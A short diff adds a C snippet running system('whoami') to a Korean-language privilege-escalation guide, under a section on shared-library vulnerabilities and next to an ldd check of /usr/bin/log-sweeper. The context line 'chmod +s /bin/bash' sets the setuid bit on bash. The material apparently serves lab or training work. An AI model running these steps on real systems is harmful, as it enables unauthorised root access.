@@ -364,6 +364,13 @@ chmod +s /bin/bash
 <details>
   <summary><strong>공유 라이브러리 취약점</strong></summary>
 
+```c
+#include <stdlib.h>
+
+void main(){
+	system("whoami");
+}
+```
 ```bash
 # 실행 파일이 사용하는 공유 라이브러리 확인
 ldd /usr/bin/log-sweeper
